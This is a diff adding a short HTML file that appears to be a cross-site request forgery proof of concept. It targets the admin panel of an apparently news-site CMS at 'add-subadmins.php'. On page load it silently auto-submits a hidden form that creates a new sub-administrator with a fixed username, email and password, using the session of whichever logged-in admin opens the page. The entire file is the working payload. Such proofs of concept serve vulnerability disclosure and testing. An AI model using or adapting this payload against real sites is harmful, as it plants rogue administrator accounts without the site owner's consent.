@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.getElementById('go').click()">
+
+    <form action="http://192.168.0.12/news/admin/add-subadmins.php" method="POST">
+      <input type="hidden" name="sadminusername" value="CSRFUser">
+      <input type="hidden" name="emailid" value="csrf@csrf.com">
+      <input type="hidden" name="pwd" value="csrf123">
+      <input type="hidden" name="submit" value="">
+      <button id="go" type="submit" style="display:none;">Submit</button>
+    </form>
+
+  </body>
+</html>
